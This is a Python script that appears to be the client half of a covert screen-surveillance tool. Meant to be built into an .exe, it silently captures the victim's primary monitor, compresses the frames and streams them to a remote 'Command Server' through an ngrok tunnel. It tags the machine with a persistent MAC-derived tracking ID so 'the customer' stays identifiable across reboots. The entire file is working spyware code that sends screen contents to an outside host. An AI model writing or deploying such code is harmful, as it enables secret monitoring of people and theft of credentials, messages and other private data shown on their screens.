import mss
import cv2
import numpy as np
import base64
import time
import socketio
import random
import string
import sys
import uuid
import hashlib

# ---------------------------------------------------------
# Configuration
# ---------------------------------------------------------
# =========================================================
# 🛑 STOP - IMPORTANT INSTRUCTION BEFORE BUILDING .EXE 🛑
# =========================================================
# Replace the URL below with the Ngrok URL printed by server.py!
# =========================================================
# 🛑 STOP - IMPORTANT INSTRUCTION BEFORE BUILDING .EXE 🛑
# =========================================================
# Replace the URL below with the Ngrok URL printed by server.py!
# Example: SERVER_URL = "https://1a2b3c4d.ngrok-free.app"
SERVER_URL = "PASTE_YOUR_NGROK_URL_HERE"
# =========================================================

def generate_tracking_token():
    """
    Generates a consistent token based on the device's hardware MAC address.
    This ensures that if the customer restarts their computer, they show up
    as the SAME device on your dashboard, not a brand new one.
    """
    mac = str(uuid.getnode())
    # Create a 96-character hash string
    hash_obj = hashlib.sha384(mac.encode())
    return hash_obj.hexdigest()

# Generate the unique tracking parameter (the '?c=' value)
CLIENT_ID = generate_tracking_token()

# Initialize WebSocket Client
sio = socketio.Client()

@sio.event
def connect():
    print("\n[+] Connection to Command Server established successfully.")
    
    # Notify server of our unique tracking token
    sio.emit('caster_connect', {'client_id': CLIENT_ID})
    
    print("=" * 100)
    print(">>> REMOTE SCREEN STREAM ACTIVE <<<")
    print(f"Watch this computer's screen live at:")
    print(f"{SERVER_URL}/sharing?c={CLIENT_ID}")
    print("=" * 100 + "\n")
    print("[*] Screen capture engine is running silently in background...")

@sio.event
def disconnect():
    print("[-] Connection dropped. Reconnecting...")

def start_streaming():
    """Captures the computer screen continuously and uploads it to the server."""
    try:
        sio.connect(SERVER_URL)
    except Exception as e:
        print(f"[!] Could not connect to {SERVER_URL}. Is the server running?")
        sys.exit(1)
        
    with mss.mss() as sct:
        # Index 1 grabs the primary monitor
        monitor = sct.monitors[1]
        
        while True:
            if not sio.connected:
                time.sleep(1)
                continue
                
            try:
                # 1. Grab screen data
                sct_img = sct.grab(monitor)
                img = np.array(sct_img)
                
                # 2. Convert raw image to JPEG format (compress it)
                scale_percent = 50 # Reduce quality to save internet bandwidth
                width = int(img.shape[1] * scale_percent / 100)
                height = int(img.shape[0] * scale_percent / 100)
                resized = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
                
                # Encode 
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 65]
                _, buffer = cv2.imencode('.jpg', resized, encode_param)
                
                # 3. Convert image to Base64 text to send over WebSocket
                jpg_as_text = base64.b64encode(buffer).decode('utf-8')
                
                # 4. Stream frame to Server
                sio.emit('video_frame', {'client_id': CLIENT_ID, 'frame': jpg_as_text})
                
                # Limit to roughly 15 frames per second
                time.sleep(1/15)
                
            except Exception as e:
                # Silently ignore frame drops to keep running
                time.sleep(1)

if __name__ == '__main__':
    print("[*] Remote Agent Started.")
    print("[*] Connecting to Command Server...")
    start_streaming()
